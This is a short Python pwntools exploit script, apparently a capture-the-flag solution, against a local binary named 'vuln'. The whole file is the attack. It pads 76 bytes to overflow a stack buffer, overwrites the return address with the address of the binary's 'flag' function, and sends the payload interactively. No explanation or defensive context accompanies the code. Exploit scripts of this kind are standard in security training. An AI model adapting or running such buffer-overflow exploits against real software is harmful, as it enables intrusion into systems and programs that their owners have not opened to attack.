#!/usr/bin/env python

from pwn import *

#Set the process and ELF
p = process('./vuln')
e = ELF('./vuln')

#Define the return address for flag
flag = e.symbols['flag']

#Offset from pwn cyclic
offset = 76

#Craft our payload
payload = ''
payload+= 'A'*offset
payload+= p32(flag)

#Send payload and set interactive mode in order to receive the flag output
p.sendline(payload)
p.interactive()
